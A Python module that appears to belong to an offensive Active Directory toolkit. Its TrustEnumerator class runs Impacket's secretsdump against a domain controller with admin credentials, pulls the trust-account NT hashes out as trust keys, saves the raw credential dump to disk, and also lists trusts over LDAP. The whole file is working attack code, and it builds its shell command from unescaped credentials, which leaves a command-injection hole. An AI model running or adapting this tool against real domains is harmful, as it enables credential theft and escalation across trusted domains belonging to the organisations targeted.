"""
Trust Enumerator
Enumerate trust relationships from a domain
"""

import subprocess
import shutil
from typing import Optional, List
from pathlib import Path
from datetime import datetime

from ..models import TrustInfo, TrustCategory, DomainTarget
from ..utils import parse_secretsdump_trusts, categorize_trust


class TrustEnumerator:
    """
    Enumerate AD trust relationships using various methods
    """

    def __init__(self, output_dir: str = "auto_trust_exploit", verbose: bool = True):
        """
        Initialize trust enumerator

        Args:
            output_dir: Directory for output files
            verbose: Print status messages
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.verbose = verbose
        self.timeout = 120

    def log(self, message: str, level: str = "info") -> None:
        """Print status message"""
        if not self.verbose:
            return
        prefixes = {"info": "[*]", "success": "[+]", "error": "[-]", "warning": "[!]"}
        print(f"{prefixes.get(level, '[*]')} {message}")

    def is_secretsdump_available(self) -> bool:
        """Check if secretsdump.py is available"""
        return shutil.which("secretsdump.py") is not None

    def enumerate_trusts_secretsdump(
            self,
            domain: str,
            username: str,
            password: str,
            dc_ip: str
    ) -> List[TrustInfo]:
        """
        Enumerate trusts using Impacket secretsdump

        Args:
            domain: Domain to enumerate
            username: Domain Admin username
            password: Password
            dc_ip: Domain controller IP

        Returns:
            List of TrustInfo objects
        """
        self.log(f"Enumerating trusts for {domain} using secretsdump...")

        if not self.is_secretsdump_available():
            self.log("secretsdump.py not available", "error")
            return []

        # Query for trust accounts (accounts ending with $)
        cmd = f"secretsdump.py {domain}/{username}:'{password}'@{dc_ip}"

        trusts = []

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )

            if result.returncode == 0 and result.stdout:
                self.log("secretsdump completed", "success")

                # Parse trust accounts from output
                parsed_trusts = parse_secretsdump_trusts(result.stdout)

                for trust_data in parsed_trusts:
                    target_domain = trust_data["target_domain"]

                    # Categorize the trust
                    category_str = categorize_trust(domain, target_domain)
                    category = TrustCategory(category_str) if category_str in [e.value for e in
                                                                               TrustCategory] else TrustCategory.UNKNOWN

                    trust = TrustInfo(
                        source_domain=domain,
                        target_domain=target_domain,
                        trust_account=trust_data["account_name"],
                        category=category,
                        trust_key=trust_data.get("nt_hash"),
                        trust_key_type="rc4" if trust_data.get("nt_hash") else None,
                    )

                    trusts.append(trust)
                    self.log(f"Found trust: {domain} -> {target_domain} ({category.value})", "success")

                # Save raw output
                self._save_output(result.stdout, domain, "secretsdump")
            else:
                self.log(f"secretsdump failed: {result.stderr}", "error")

        except subprocess.TimeoutExpired:
            self.log("secretsdump timeout", "error")
        except Exception as e:
            self.log(f"Error: {e}", "error")

        return trusts

    def enumerate_trusts_ldap(
            self,
            domain: str,
            username: str,
            password: str,
            dc_ip: str
    ) -> List[TrustInfo]:
        """
        Enumerate trusts using LDAP queries

        Args:
            domain: Domain to enumerate
            username: Username
            password: Password
            dc_ip: Domain controller IP

        Returns:
            List of TrustInfo objects
        """
        self.log(f"Enumerating trusts for {domain} using LDAP...")

        trusts = []

        try:
            # Try using ldap3 library
            import ldap3

            # Build LDAP connection
            server = ldap3.Server(dc_ip, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{domain}\\{username}",
                password=password,
                authentication=ldap3.NTLM
            )

            if not conn.bind():
                self.log(f"LDAP bind failed: {conn.result}", "error")
                return trusts

            self.log("LDAP connected", "success")

            # Build base DN
            base_dn = ",".join([f"DC={part}" for part in domain.split(".")])

            # Search for trusted domains
            search_filter = "(objectClass=trustedDomain)"
            attributes = ["name", "trustPartner", "trustDirection", "trustType", "trustAttributes"]

            conn.search(
                search_base=f"CN=System,{base_dn}",
                search_filter=search_filter,
                attributes=attributes
            )

            for entry in conn.entries:
                target_domain = str(entry.trustPartner) if hasattr(entry, 'trustPartner') else str(entry.name)
                target_domain = target_domain.lower()

                # Parse trust direction
                trust_direction = int(str(entry.trustDirection)) if hasattr(entry, 'trustDirection') else 0
                is_bidirectional = trust_direction == 3  # 3 = bidirectional

                # Categorize
                category_str = categorize_trust(domain, target_domain)
                category = TrustCategory(category_str) if category_str in [e.value for e in
                                                                           TrustCategory] else TrustCategory.UNKNOWN

                trust = TrustInfo(
                    source_domain=domain,
                    target_domain=target_domain,
                    trust_account=f"{target_domain.split('.')[0].upper()}$",
                    category=category,
                    is_bidirectional=is_bidirectional,
                )

                trusts.append(trust)
                self.log(f"Found trust: {domain} -> {target_domain} ({category.value})", "success")

            conn.unbind()

        except ImportError:
            self.log("ldap3 library not available, skipping LDAP enumeration", "warning")
        except Exception as e:
            self.log(f"LDAP enumeration error: {e}", "error")

        return trusts

    def enumerate_all(
            self,
            domain: str,
            username: str,
            password: str,
            dc_ip: str
    ) -> List[TrustInfo]:
        """
        Enumerate trusts using all available methods

        Args:
            domain: Domain to enumerate
            username: Username
            password: Password
            dc_ip: Domain controller IP

        Returns:
            Combined list of unique TrustInfo objects
        """
        self.log(f"Running comprehensive trust enumeration for {domain}...")

        all_trusts = []
        seen_targets = set()

        # Try secretsdump first (gets trust keys)
        sd_trusts = self.enumerate_trusts_secretsdump(domain, username, password, dc_ip)
        for trust in sd_trusts:
            if trust.target_domain not in seen_targets:
                all_trusts.append(trust)
                seen_targets.add(trust.target_domain)

        # Try LDAP for additional info
        ldap_trusts = self.enumerate_trusts_ldap(domain, username, password, dc_ip)
        for trust in ldap_trusts:
            if trust.target_domain not in seen_targets:
                all_trusts.append(trust)
                seen_targets.add(trust.target_domain)

        self.log(f"Total trusts discovered: {len(all_trusts)}", "success")

        return all_trusts

    def _save_output(self, output: str, domain: str, method: str) -> Path:
        """Save enumeration output to file"""
        filename = f"trust_enum_{domain}_{method}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = self.output_dir / filename

        filepath.write_text(output)
        self.log(f"Output saved to: {filepath}")

        return filepath